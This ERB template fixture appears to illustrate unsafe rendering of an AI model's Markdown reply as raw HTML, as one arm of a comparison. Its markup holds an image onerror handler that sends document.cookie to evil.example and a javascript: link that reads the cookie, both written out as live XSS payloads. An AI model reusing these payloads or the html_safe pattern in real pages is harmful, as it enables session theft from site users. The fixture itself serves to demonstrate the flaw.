<%# The raw-Tailwind arm for the same reply - realistic, not a strawman:
    plausible layout, a Markdown gem's output marked html_safe, with the
    typical tells (what the model wrote is the page's markup, so an
    image's error handler and a script link are live; the reply's # is a
    second h1; the link out carries no rel; the citation is a bare
    bracketed number that names no source). %>
<div class="flex gap-3">
  <div class="prose prose-sm max-w-none">
    <h1>Late orders</h1>
    <p>Two orders are <strong>late</strong> <sup><a href="https://example.com/orders/late">[1]</a></sup>. See <a href="https://example.com/fulfilment">the guide</a> or <a href="javascript:alert(document.cookie)">open the report</a>.</p>
    <img src="x" onerror="fetch('https://evil.example/?c=' + document.cookie)">
    <pre><code class="language-ruby">Order.processing.where(due_on: ...Date.current)</code></pre>
  </div>
</div>
